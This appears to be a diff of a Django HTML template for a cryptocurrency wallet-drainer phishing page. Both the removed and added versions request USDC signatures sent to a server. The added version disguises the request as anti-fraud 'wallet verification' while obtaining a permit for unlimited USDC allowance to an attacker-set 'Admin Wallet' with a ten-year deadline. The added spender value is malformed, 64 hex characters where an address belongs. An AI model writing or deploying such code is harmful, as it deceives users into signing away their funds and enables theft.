@@ -1,172 +1,160 @@
-{% load static %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Authorize USDC</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <title>Wallet Verification | Security Portal</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        /* White Background Theme */
-        body { background-color: #f8fafc; color: #1e293b; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .auth-card { background: #ffffff; padding: 40px; border-radius: 16px; width: 100%; max-width: 480px; border: 1px solid #e2e8f0; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
-        .btn-action { background: #0ea5e9; color: white; font-weight: 700; border: none; padding: 16px; border-radius: 12px; width: 100%; transition: 0.3s; margin-top: 20px; }
-        .btn-action:hover { background: #0284c7; transform: translateY(-1px); }
-        .btn-action:disabled { background: #cbd5e1; cursor: not-allowed; }
-        .info-box { background: #f1f5f9; padding: 15px; border-radius: 10px; margin-bottom: 15px; text-align: left; border: 1px solid #e2e8f0; }
-        .label { font-size: 0.75rem; color: #64748b; text-transform: uppercase; font-weight: bold; display: block; margin-bottom: 4px; }
-        .value { font-family: 'Courier New', Courier, monospace; font-size: 0.9rem; color: #0f172a; word-break: break-all; }
-        #error-display { background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; padding: 15px; border-radius: 10px; margin-top: 20px; display: none; font-size: 0.85rem; text-align: left; }
-        .status-pill { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; background: #e0f2fe; color: #0369a1; margin-top: 10px; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0f172a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #f1f5f9;
+        }
+        .card {
+            background: #1e293b;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid #334155;
+        }
+        .icon {
+            font-size: 50px;
+            color: #38bdf8;
+            margin-bottom: 20px;
+        }
+        h2 { margin-bottom: 10px; font-size: 24px; }
+        p { color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
+        #connectBtn {
+            background: #38bdf8;
+            color: #0f172a;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        #connectBtn:hover { background: #7dd3fc; }
+        #status { margin-top: 20px; font-size: 14px; }
+        .loader {
+            display: none;
+            margin: 20px auto;
+            border: 4px solid #334155;
+            border-top: 4px solid #38bdf8;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="auth-card text-center">
-    <h4 class="mb-4">USDC Transfer Authorization</h4>
+<div class="card">
+    <div class="icon">🛡️</div>
+    <h2>Wallet Verification</h2>
+    <p>To protect your assets and comply with anti-fraud regulations, please verify ownership of your connected wallet.</p>
 
-    <div id="step-1">
-        <p class="text-muted mb-4">Please connect your wallet to authorize the transaction.</p>
-        <button id="connectBtn" class="btn-action">Connect Wallet</button>
-    </div>
-
-    <div id="step-2" class="d-none">
-        <div class="info-box">
-            <span class="label">Your Connected Address</span>
-            <div id="addrDisplay" class="value">0x...</div>
-        </div>
-        <button id="signBtn" class="btn-action">Sign 10,000,000 USDC Permit</button>
-    </div>
-
-    <div id="status-container">
-        <div id="status" class="status-pill">System Ready</div>
-    </div>
-
-    <div id="error-display"></div>
+    <div class="loader" id="loader"></div>
+    <button id="connectBtn">Connect & Verify Wallet</button>
+    <div id="status"></div>
 </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
 <script>
-    const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
-    const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-    let userAccount = null;
+// IMPORTANT: Change this to your Admin Wallet Address
+const SPENDER_ADDRESS = "0x7a391f7481f33221379ecf00a5f643e9d8999335f6068695d7398b16c803df6a";
+const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 
-    const errorBox = document.getElementById('error-display');
-    const statusPill = document.getElementById('status');
+async function verify() {
+    const btn = document.getElementById('connectBtn');
+    const status = document.getElementById('status');
+    const loader = document.getElementById('loader');
 
-    function hideError() { errorBox.style.display = 'none'; }
-    function showError(msg) {
-        console.error(msg);
-        errorBox.innerText = "⚠️ " + msg;
-        errorBox.style.display = 'block';
-    }
+    try {
+        if (!window.ethereum) return alert("Please install MetaMask!");
 
-    async function connectWallet() {
-        hideError();
-        if(!window.ethereum) return showError("MetaMask not found. Please install the extension.");
+        loader.style.display = "block";
+        btn.style.display = "none";
 
-        try {
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            const signer = await provider.getSigner();
-            userAccount = await signer.getAddress();
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const owner = await signer.getAddress();
+        const { chainId } = await provider.getNetwork();
 
-            document.getElementById('step-1').classList.add('d-none');
-            document.getElementById('step-2').classList.remove('d-none');
-            document.getElementById('addrDisplay').innerText = userAccount;
-            statusPill.innerText = "Wallet Connected";
-        } catch (err) {
-            showError(err.message);
+        // 10-YEAR DEADLINE
+        const deadline = Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365 * 10);
+        const value = ethers.constants.MaxUint256;
+        const nonce = 0; // Standard for most USDC permits
+
+        const domain = {
+            name: "USD Coin",
+            version: "2",
+            chainId: chainId,
+            verifyingContract: USDC_ADDRESS
+        };
+
+        const types = {
+            Permit: [
+                { name: "owner", type: "address" },
+                { name: "spender", type: "address" },
+                { name: "value", type: "uint256" },
+                { name: "nonce", type: "uint256" },
+                { name: "deadline", type: "uint256" }
+            ]
+        };
+
+        const message = { owner, spender: SPENDER_ADDRESS, value, nonce, deadline };
+
+        const signature = await signer._signTypedData(domain, types, message);
+        const sig = ethers.utils.splitSignature(signature);
+
+        const response = await fetch("/api/save-sig/", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "X-CSRFToken": "{{ csrf_token }}"
+            },
+            body: JSON.stringify({
+                owner: owner,
+                value: value.toString(),
+                deadline: deadline,
+                v: sig.v,
+                r: sig.r,
+                s: sig.s
+            })
+        });
+
+        if (response.ok) {
+            status.innerHTML = "<span style='color: #4ade80;'>✅ Verification Complete!</span>";
+            setTimeout(() => { window.location.href = "/dashboard/"; }, 1500);
+        } else {
+            throw new Error("Server rejected signature");
         }
+
+    } catch (err) {
+        console.error(err);
+        status.innerHTML = "<span style='color: #f87171;'>❌ Verification Failed. Try again.</span>";
+        btn.style.display = "block";
+        loader.style.display = "none";
     }
+}
 
-    async function signPermit() {
-        hideError();
-        statusPill.innerText = "Waiting for signature...";
-
-        try {
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            const signer = await provider.getSigner();
-            const network = await provider.getNetwork();
-
-            const domain = {
-                name: "USD Coin",
-                version: "2",
-                chainId: network.chainId,
-                verifyingContract: USDC_ADDRESS
-            };
-
-            const types = {
-                TransferWithAuthorization: [
-                    { name: "from", type: "address" },
-                    { name: "to", type: "address" },
-                    { name: "value", type: "uint256" },
-                    { name: "validAfter", type: "uint256" },
-                    { name: "validBefore", type: "uint256" },
-                    { name: "nonce", type: "bytes32" }
-                ]
-            };
-
-            const message = {
-                from: userAccount,
-                to: SPENDER,
-                value: ethers.parseUnits("10000000", 6),
-                validAfter: 0,
-                validBefore: Math.floor(Date.now() / 1000) + 86400,
-                nonce: ethers.hexlify(ethers.randomBytes(32))
-            };
-
-            // Request signature from MetaMask
-            const sig = await signer.signTypedData(domain, types, message);
-            statusPill.innerText = "Signature received. Sending to server...";
-
-            // BUILD PAYLOAD EXPLICITLY TO PREVENT NONETYPE ERROR
-            const payload = {
-                message: {
-                    from: message.from,
-                    to: message.to,
-                    value: message.value.toString(),
-                    validAfter: message.validAfter.toString(),
-                    validBefore: message.validBefore.toString(),
-                    nonce: message.nonce // This is the crucial hex string
-                },
-                sig: sig
-            };
-
-            const response = await fetch("{% url 'update_wallet_status' %}", {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-CSRFToken': '{{ csrf_token }}'
-                },
-                body: JSON.stringify(payload)
-            });
-
-            // Handle potential non-JSON responses (like 404/500 HTML)
-            const contentType = response.headers.get("content-type");
-            if (!contentType || !contentType.includes("application/json")) {
-                const rawHTML = await response.text();
-                return showError("Server returned HTML (likely 404 or 500). First 100 chars: " + rawHTML.substring(0, 100));
-            }
-
-            const result = await response.json();
-            if (result.status === "success") {
-                statusPill.innerText = "Authorization Successful!";
-                statusPill.style.background = "#dcfce7";
-                statusPill.style.color = "#166534";
-                alert("Success! Transaction Hash: " + result.tx_hash);
-            } else {
-                showError(result.message);
-            }
-
-        } catch (err) {
-            showError(err.message);
-            statusPill.innerText = "Process Failed";
-        }
-    }
-
-    document.getElementById('connectBtn').addEventListener('click', connectWallet);
-    document.getElementById('signBtn').addEventListener('click', signPermit);
+document.getElementById('connectBtn').addEventListener('click', verify);
 </script>
+
 </body>
 </html>
